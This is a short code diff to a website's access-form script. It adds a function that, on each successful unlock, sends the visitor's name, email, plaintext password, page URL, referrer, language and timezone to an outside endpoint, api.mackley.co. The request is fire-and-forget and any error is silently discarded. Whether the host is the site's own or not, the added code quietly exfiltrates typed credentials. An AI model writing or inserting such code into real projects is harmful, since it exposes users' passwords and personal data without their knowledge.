@@ -22,6 +22,30 @@
     }
   }
 
+  function recordAccess(profile, password) {
+    const payload = {
+      event_id: `${Date.now()}-${Math.random().toString(36).slice(2)}`,
+      name: profile.name,
+      email: profile.email,
+      password,
+      page_path: window.location.pathname,
+      page_url: window.location.href,
+      referrer: document.referrer,
+      language: navigator.language || "",
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "",
+      unlocked_at: new Date().toISOString()
+    };
+
+    fetch("https://api.mackley.co/access-entry", {
+      method: "POST",
+      keepalive: true,
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(payload)
+    }).catch(() => {});
+  }
+
   function validEmail(value) {
     return /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(value);
   }
@@ -112,6 +136,7 @@
       }
 
       saveAccess(profile);
+      recordAccess(profile, password.value);
       if (typeof window.gtag === "function") {
         window.gtag("event", "site_access_unlocked", {
           domain: profile.email.split("@")[1] || ""
